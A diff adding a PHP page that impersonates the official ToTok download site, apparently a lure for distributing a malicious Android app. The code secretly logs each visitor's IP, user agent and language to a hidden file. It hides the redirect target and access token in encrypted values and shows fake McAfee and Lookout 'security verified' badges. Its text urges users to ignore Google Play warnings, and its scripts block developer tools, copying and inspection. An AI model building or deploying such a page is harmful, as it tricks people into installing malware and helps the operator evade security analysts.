@@ -1,0 +1,441 @@
+<?php
+ob_start();
+ini_set('display_errors', 0);
+error_reporting(0);
+session_start();
+include_once 'token.php';
+include_once 'sdhsdsdsswe1.php';
+
+if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) === false && 
+    strpos($_SERVER['HTTP_ACCEPT'] ?? '', 'text/html') === false) {
+    http_response_code(403);
+    exit('Access Denied');
+}
+
+ini_set('display_errors', 0);
+error_reporting(0);
+
+// Remove server signature headers
+header('X-Powered-By: ');
+header('Server: ');
+header('X-Content-Type-Options: nosniff');
+header('X-Frame-Options: DENY');
+header('Cache-Control: no-store, no-cache, must-revalidate');
+header('Pragma: no-cache');
+
+if (isset($_SESSION['all_params']) && !empty($_SESSION['all_params'])) {
+    $_GET = $_SESSION['all_params'];  
+    $_SESSION['fake_viewed'] = true;
+    $fake_token = generateToken();    
+    $script_dir = dirname($_SERVER['PHP_SELF']);
+    $clean_base = rtrim($script_dir, '/') . '/';
+    $fake_url = $clean_base . '?ftfake=' . $fake_token; 
+}
+
+$folder = './treygfdhghfgs/';
+$file = $folder . 'fhddddsff.txt';
+if (!is_dir($folder)) {
+    mkdir($folder, 0755, true);
+}
+
+$data = [
+       'Date: ' . date('Y-m-d H:i:s'),
+       SecureAdvCrypt::encrypt('Identifier:' . uniqid()),
+       SecureAdvCrypt::encrypt('IP:'.$_SERVER['REMOTE_ADDR'] ?? 'Unknown'),
+       SecureAdvCrypt::encrypt('Useragent:'.$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'),
+       SecureAdvCrypt::encrypt('Lang:'.$_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown'),
+       SecureAdvCrypt::encrypt('url:'.$_SERVER['REQUEST_URI'] ?? 'Unknown')
+];
+
+$content = implode("\n", $data) . "\n---\n";
+file_put_contents($file, $content, FILE_APPEND | LOCK_EX);
+
+$hsdgsdfsywe="aj4uZaNVIWN0pBJWu/ReRhz+YgaEpWg6d07XkI39hKAUCjQrVD0JRA9jpY9VNTZBwS/QElspif6vmtI2nHpWId0=";
+$trrrntiok = SecureAdvCrypt::decrypt($hsdgsdfsywe);
+if (!isset($_GET['fti54d']) || empty($_GET['fti54d'])) {
+     header("Location:" . $trrrntiok);
+}
+$todfds = trim($_GET['fti54d'], '"');
+$encrypted_i4n = str_replace(' ', '+', $todfds);
+if (empty($todfds)) {
+       header("Location:" . $trrrntiok);
+}
+$decrypted = SecureAdvCrypt::decrypt($encrypted_i4n);
+if ($decrypted === null) {
+       header("Location:" . $trrrntiok);
+}
+
+$_SESSION['all_params'] = $_GET;
+$_SESSION['request_uri'] = $_SERVER['REQUEST_URI'];
+$_SESSION['fake_viewed'] = true;  
+
+$fake_token = generateToken();
+
+$script_dir = dirname($_SERVER['PHP_SELF']);
+$clean_base = rtrim($script_dir, '/') . '/';
+$fake_url = $clean_base . '?ftfake=' . $fake_token;
+
+if (isset($_GET['ftfake']) && !isset($_SESSION['all_params']) && !validateToken($_GET['ftfake'])) {
+    header("Location: " . $trrrntiok);
+    exit;
+}
+
+// अब सभी HTML को एक वेरिएबल में स्टोर करें
+$htmlTemplate = <<<HTML
+<html dir="ltr" lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width,initial-scale=1" name="viewport"/>
+  <title>App download – Official channel for free download</title>
+  <link as="style" href="/css/gcddss.css" rel="preload"/>
+  <link as="script" href="/js/chunk-vendors.f4c815a0.js" rel="preload"/>
+  <link href="css/text54545gsds.css" rel="stylesheet" type="text/css"/>
+  <link href="css/gcddss.css" rel="stylesheet"/>
+  <link href="css/vi_res990909.css" rel="stylesheet"/>
+  <style>
+ #devtools-warning {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.95);
+      z-index: 999999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: #ff4444;
+      font-size: 1.5rem;
+      font-weight: bold;
+      text-align: center;
+      gap: 20px;
+    }
+    #devtools-warning.active { display: flex; }
+    #devtools-warning span   { font-size: 4rem; }
+  </style>
+ </head>
+ <body>
+  <svg aria-hidden="true" id="__SVG_SPRITE_NODE__" style="position: absolute; width: 0; height: 0" xmlns="" xmlns:xlink="">
+   <symbol id="icon-logo" viewbox="0 0 595.3 841.9" xmlns="" xmlns:xlink="">
+    <style type="text/css">
+     #icon-logo .st0{fill:#FFFFFF;}
+    </style>
+   </symbol>
+   <symbol id="icon-test" viewbox="0 0 595.3 841.9" xmlns="" xmlns:xlink="">
+    <style type="text/css">
+     #icon-test .st0{fill:#FFFFFF;}
+    </style>
+   </symbol>
+  </svg>
+  <noscript><strong>This site doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
+  <div data-v-e8999184="" id="app">
+   <section class="main" data-vcdfsa32="" data-v-e8999184="" id="mainbox">
+    <header class="headerTitle view_video_header" data-vcdfsa32="">
+     <section class="headerTop pctotok" data-vcdfsa32="">
+      <section class="header-container" data-vcdfsa32="">
+        <img src="images/favicon.ico" alt="logo of totok free video call app" class="totokLogo" style="width: 40px; height: auto;">
+        <a class="" data-vcdfsa32="" href="#">HOME</a>
+        <a class="" data-vcdfsa32="" href="#">FEATURES</a>
+        <a class="" data-vcdfsa32="" href="#">NEWS</a>
+        <a class="active" data-vcdfsa32="" href="#">DOWNLOAD</a>
+        <a class="" data-vcdfsa32="" href="#">SECURITY</a>
+        <a class="" data-vcdfsa32="" href="#">FAQ</a>
+        <div class="language" data-B-fsdsd87="" data-vcdfsa32="" dir="ltr">
+          <div data-B-fsdsd87="" style="width: 5px;"></div>
+          <div class="desc" data-B-fsdsd87="">English</div>
+          <div data-B-fsdsd87="" style="width: 5px;"></div>
+          <div class="arrow" data-B-fsdsd87=""></div>
+          <div class="submenu" data-B-fsdsd87="">
+            <div class="holder" data-B-fsdsd87=""></div>
+            <p data-B-fsdsd87="">Select your language</p>
+            <ul data-B-fsdsd87=""><li data-B-fsdsd87="">English</li><li data-B-fsdsd87="">العربية</li></ul>
+          </div>
+        </div>
+      </section>
+     </section>
+     <section class="mobileTotok" data-vcdfsa32="">
+      <section class="mobile-list-item" data-vcdfsa32="" style="display: none;">
+       <ol data-vcdfsa32="">
+        <li class="link" data-vcdfsa32=""><span data-vcdfsa32="">HOME</span></li>
+        <li class="link" data-vcdfsa32=""><span data-vcdfsa32="">FEATURES</span></li>
+        <li class="link" data-vcdfsa32=""><span data-vcdfsa32="">NEWS</span></li>
+        <li class="active link" data-vcdfsa32=""><span data-vcdfsa32="">DOWNLOAD</span></li>
+        <li class="link" data-vcdfsa32=""><span data-vcdfsa32="">SECURITY</span></li>
+        <li class="link" data-vcdfsa32=""><span data-vcdfsa32="">FAQ</span></li>
+        <li data-vcdfsa32="">
+          <div class="language mobile" data-B-fsdsd87="" data-vcdfsa32="" dir="ltr">
+            <div data-B-fsdsd87="" style="width: 10px;"></div>
+            <div class="desc" data-B-fsdsd87="">English</div>
+            <div data-B-fsdsd87="" style="width: 10px;"></div>
+            <div class="arrow" data-B-fsdsd87=""></div>
+            <div class="mobile-dialog" data-B-fsdsd87="" style="display: none;">
+              <div class="box" data-B-fsdsd87="">
+                <p data-B-fsdsd87="">Select your language</p>
+                <ul data-B-fsdsd87="">
+                  <li data-B-fsdsd87=""><div data-B-fsdsd87="">English</div><div class="circle light" data-B-fsdsd87=""></div></li>
+                  <li data-B-fsdsd87=""><div data-B-fsdsd87="">العربية</div><div class="circle" data-B-fsdsd87=""></div></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </li>
+       </ol>
+      </section>
+     </section>
+    </header>
+    <section class="download_wrapper" data-TT-djsasa="" data-vcdfsa32="">
+       <video autoplay muted loop playsinline class="back-video">
+          <source src="images/Vid.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+       </video>
+       <a class="download_tips" data-TT-djsasa="" href="#notification_wrapper">Click to view download tips</a>
+       <section class="download_totok" data-TT-djsasa="">
+         <div class="download_official" data-TT-djsasa="">
+           <p class="donwload_title" data-v-61838738="">Download the latest version for Android</p>
+           <p class="donwload_title_mobile" data-TT-djsasa="" style="display: none;">Download the latest version for Android</p>
+           <a href="HIER_JE_DOWNLOAD_URL" download>
+             <img alt="HD video call and voice chat for free" class="official_img" data-TT-djsasa="" src="images/Free765.png" />
+           </a>
+           <p class="version" data-TT-djsasa="">Version 1.0.0</p>
+           <p class="release_time" data-TT-djsasa="">Released on 2024.10.01 15:00 (UTC +04:00)</p>
+           <div class="verified_by_wrapper" data-TT-djsasa="">
+              <img src="images/gg66.png" alt="security icon" data-TT-djsasa="" style="width: 15px; height: auto;" />
+              <p class="verified_by_label" data-TT-djsasa="">Security verified by</p>
+           </div>
+           <div class="verified_box" data-TT-djsasa="">
+              <div class="verified_item" data-TT-djsasa="">
+                 <img src="images/imh44.png" alt="CM Security" class="verified_item_img" data-TT-djsasa="" style="width: 15px; height: auto;" />
+                 <p class="verified_item_label" data-TT-djsasa="">CM Security</p>
+              </div>
+              <div class="verified_item" data-TT-djsasa="">
+                 <img src="images/ut78.png" alt="Lookout Security" class="verified_item_img" data-TT-djsasa="" style="width: 15px; height: auto;" />
+                 <p class="verified_item_label" data-TT-djsasa="">Lookout Security</p>
+              </div>
+              <div class="verified_item" data-TT-djsasa="">
+                 <img src="images/mac98.png" alt="McAfee" class="verified_item_img" data-TT-djsasa="" style="width: 15px; height: auto;" />
+                 <p class="verified_item_label" data-TT-djsasa="">McAfee</p>
+              </div>
+           </div>
+         </div>
+         <div class="download_available" data-TT-djsasa="">
+           <p class="avaliable_wrapper" data-TT-djsasa="">Also available on</p>
+           <ul data-TT-djsasa="">
+              <li data-TT-djsasa=""><img alt="download" class="download_icon" data-TT-djsasa="" src="images/huaweilogo_download.9edd2470.png"/></li>
+              <li data-TT-djsasa=""><img alt="download" class="download_icon" data-TT-djsasa="" src="images/ic_home_samsung.0876acc0.png"/></li>
+              <li data-TT-djsasa=""><img alt="download" class="download_icon" data-TT-djsasa="" src="images/3.png"/></li>
+              <li data-TT-djsasa=""><img alt="download" class="download_icon" data-TT-djsasa="" src="images/4.png"/></li>
+              <li data-TT-djsasa=""><img alt="download" class="download_icon" data-TT-djsasa="" src="images/1.png"/></li>
+              <li data-TT-djsasa=""><img alt="download" class="download_icon" data-TT-djsasa="" src="images/2.png"/></li>
+           </ul>
+           <p class="available_download_label" data-TT-djsasa="">App is also available on the app stores of other phone makers such as Vivo.</p>
+           <div data-TT-djsasa="" id="notification_wrapper" name="notification_wrapper" style="padding-top: 30px;"></div>
+         </div>
+       </section>
+       <div class="notification_box" data-TT-djsasa="">
+          <section class="notification_wrapper" data-TT-djsasa="">
+             <div class="notification_container" data-TT-djsasa="">
+                <h3 data-TT-djsasa="">App Clarification Message to Latest Google Notification</h3>
+                <p data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85);">We have been informed that some of our Android users are receiving Google Play Store notifications not to install ToTok.</p>
+                <img alt="ToTok is secure and safe to download and use" class="android_download_pic" data-TT-djsasa="" src="images/dsee5687.png" style="display: none;"/>
+                <p data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 20px;">We encourage you to ignore the Google Play Store message and continue to install and enjoy ToTok. Our app is secure and used safely by millions of people around the world. Please <a data-TT-djsasa="" href="#security" style="color: rgb(67, 120, 242);">click here</a> to learn more about our privacy and security features.</p>
+                <p data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 20px;">Here are some important facts about ToTok:</p>
+                <li data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 15px;">ToTok has NO access to user SMS messages, meaning ToTok does NOT read or track user messages</li>
+                <li data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 15px;">ToTok does NOT view or upload any user photos</li>
+                <li data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 15px;">ToTok has NO access to user call history, meaning ToTok does not read or track user call history</li>
+                <li data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 15px;">ToTok does NOT listen to or upload any user audio recordings</li>
+                <li data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin-bottom: 15px;">ToTok has access to less user data than other leading instant messaging applications, such as WhatsApp and Telegram</li>
+                <p data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin: 20px 0px;">Please note that to make it easier for everyone to stay up to date on the recent coronavirus outbreak, we introduced "Coronavirus Live Updates", a dedicated section that allows you to access the latest statistics and global news on the COVID-19 epidemic.</p>
+                <p data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin: 20px 0px;">Going forward, we will be launching a number of new features to enhance your experience on our app, including ToTok News, ToTok Games Center, and lots more!</p>
+                <p data-TT-djsasa="" style="font-size: 16px; line-height: 26px; color: rgb(85, 85, 85); margin: 20px 0px;">Thank you for joining the ToTok community!</p>
+             </div>
+             <img alt="ToTok is secure and safe to download and use" class="android_download_pic" data-TT-djsasa="" src="images/downloadAndroidContent.7bfc4d4b.png"/>
+          </section>
+       </div>
+       <footer class="foot_box" data-v-56dd6e6b="" data-TT-djsasa="">
+         <div class="nav_foot_container" data-v-56dd6e6b="">
+            <div class="nav_foot_body" data-v-56dd6e6b="">
+               <ul data-v-56dd6e6b="">TOTOK
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#features">Features</a></li>
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">News</a></li>
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">Security</a></li>
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">Terms of Use</a></li>
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">Privacy Policy</a></li>
+               </ul>
+               <ul data-v-56dd6e6b="">COMPANY
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">About</a></li>
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">Careers</a></li>
+               </ul>
+               <ul data-v-56dd6e6b="">DOWNLOAD
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">Android</a></li>
+               </ul>
+               <ul data-v-56dd6e6b="">HELP
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">FAQ</a></li>
+                  <li data-v-56dd6e6b=""><a data-v-56dd6e6b="" href="#">Contact Us</a></li>
+               </ul>
+            </div>
+            <div class="nav_foot_download_container" data-v-56dd6e6b="">
+               <a data-v-56dd6e6b="" href="#"><img alt="HD video call and voice chat for free " class="downloadshop--pc" data-v-56dd6e6b="" src="images/ic_home_totok.fbce05c4.png"/></a>
+               <a data-v-56dd6e6b=""><img alt="ToTok app download for Huawei devices " class="downloadshop--pc" data-v-56dd6e6b="" src="images/huaweilogo_homepage.0e787941.png"/></a>
+               <a data-v-56dd6e6b=""><img alt="download ToTok free video call app for Samsung" class="downloadshop--pc" data-v-56dd6e6b="" src="images/ic_home_samsung.0876acc0.png"/></a>
+            </div>
+         </div>
+         <div class="copyright" data-v-56dd6e6b="">
+            <span data-v-56dd6e6b="">All rights reserved, 2026 © TOTOK TECHNOLOGY LTD</span>
+            <div data-v-56dd6e6b="" style="display: flex; gap: 15px; align-items: center;">
+               <img src="images/aa-03.png" alt="ToTok on Twitter" class="share_icon" style="width: 25px; height: auto;" />
+               <img src="images/aa-04.png" alt="ToTok on Facebook" class="share_icon" style="width: 25px; height: auto;" />
+               <img src="images/aa-01.png" alt="ToTok on Instagram" class="share_icon" style="width: 25px; height: auto;" />
+               <img src="images/aa-02.png" alt="ToTok on YouTube" class="share_icon" style="width: 25px; height: auto;" />
+            </div>
+         </div>
+       </footer>
+    </section>
+   </section>
+ </div>
+ <script>
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+  e.stopPropagation();
+  return false;
+}, true);
+document.addEventListener('keydown', function(e) {
+  var key = e.key ? e.key.toLowerCase() : '';
+  var code = e.code ? e.code.toLowerCase() : '';
+  if (e.keyCode >= 112 && e.keyCode <= 123) {
+    e.preventDefault(); e.stopPropagation(); return false;
+  }
+  if (e.ctrlKey || e.metaKey) {
+    var blocked = ['u',  's',  'a',  'c',  'v',  'x',  'p',  'f',  'g',  'h',  'j',  'k',  'i',  'l',  'n',  't',  'w',  'r',  'b',  ];
+    if (blocked.indexOf(key) !== -1) {
+      e.preventDefault(); e.stopPropagation(); return false;
+    }
+    if (e.shiftKey) {
+      var blockedShift = ['i','j','c','k','e','m','p','q','r','s','u'];
+      if (blockedShift.indexOf(key) !== -1) {
+        e.preventDefault(); e.stopPropagation(); return false;
+      }
+    }
+  }
+  if (e.altKey && key === 'f4') {
+    e.preventDefault(); return false;
+  }
+}, true);
+document.addEventListener('keyup', function(e) {
+  if (e.keyCode >= 112 && e.keyCode <= 123) {
+    e.preventDefault(); return false;
+  }
+}, true);
+document.addEventListener('keypress', function(e) {
+  if (e.ctrlKey || e.metaKey) {
+    e.preventDefault(); return false;
+  }
+}, true);
+document.addEventListener('selectstart', function(e) {
+  e.preventDefault(); return false;
+}, true);
+document.addEventListener('dragstart', function(e) {
+  e.preventDefault(); return false;
+}, true);
+['copy','cut','paste'].forEach(function(evt) {
+  document.addEventListener(evt, function(e) {
+    e.preventDefault(); return false;
+  }, true);
+});
+window.addEventListener('beforeprint', function(e) {
+  e.preventDefault();
+  document.body.innerHTML = '<h1 style="text-align:center;margin-top:40vh;color:red;">Printing Not Allowed!</h1>';
+});
+window.onbeforeprint = function() { return false; };
+(function() {
+  var origPrint = window.print;
+  window.print = function() {
+    console.clear();
+    return false;
+  };
+})();
+var devtoolsOpen = false;
+var warning = document.getElementById('devtools-warning');
+function checkDevToolsBySize() {
+  var threshold = 160;
+  var widthDiff  = window.outerWidth  - window.innerWidth;
+  var heightDiff = window.outerHeight - window.innerHeight;
+  if (widthDiff > threshold || heightDiff > threshold) {
+    openWarning();
+  } else {
+    closeWarning();
+  }
+}
+function checkDevToolsByConsole() {
+  var start = performance.now();
+  var el = new Image();
+  Object.defineProperty(el, 'id', {
+    get: function() {
+      devtoolsOpen = true;
+      openWarning();
+    }
+  });
+  console.log('%c', el);
+  console.clear();
+}
+function checkDebugger() {
+  var start = new Date();
+  debugger;
+  var diff = new Date() - start;
+  if (diff > 100) {
+    openWarning();
+  }
+}
+function openWarning() {
+  if (!devtoolsOpen) {
+    devtoolsOpen = true;
+    document.open();
+    document.write('<html><body style="background:white; margin:0; padding:0;"></body></html>');
+    document.close();
+    window.stop(); 
+  }
+}
+function closeWarning() {
+  if (devtoolsOpen) {
+    devtoolsOpen = false;
+    warning.classList.remove('active');
+  }
+}
+setInterval(checkDevToolsBySize, 500);
+setInterval(checkDevToolsByConsole, 1000);
+setInterval(checkDebugger, 2000);
+setInterval(function() { console.clear(); }, 500);
+(function() {
+  var noop = function() {};
+  var methods = ['log','warn','error','info','debug','table','dir',
+                 'dirxml','group','groupEnd','time','timeEnd',
+                 'count','trace','profile','profileEnd'];
+  methods.forEach(function(m) {
+    try { console[m] = noop; } catch(e) {}
+  });
+})();
+Object.defineProperty(console, '_commandLineAPI', {
+  get: function() { throw new Error('Inspect Karna Mana Hai!'); }
+});
+if (window.top !== window.self) {
+  window.top.location = window.self.location;
+}
+document.write = function() { return false; };
+document.addEventListener('touchstart', function(e) {
+  if (e.touches.length > 1) { e.preventDefault(); }
+}, { passive: false });
+var touchTimer;
+document.addEventListener('touchstart', function() {
+  touchTimer = setTimeout(function() {}, 600);
+}, false);
+document.addEventListener('touchend', function() {
+  clearTimeout(touchTimer);
+}, false);
+document.addEventListener('touchmove', function(e) {
+  clearTimeout(touchTimer);
+}, false);
+</script>
+ </body>
+</html>
+HTML;
+
+// अब HTML को आउटपुट करें
+echo $htmlTemplate;
+?>
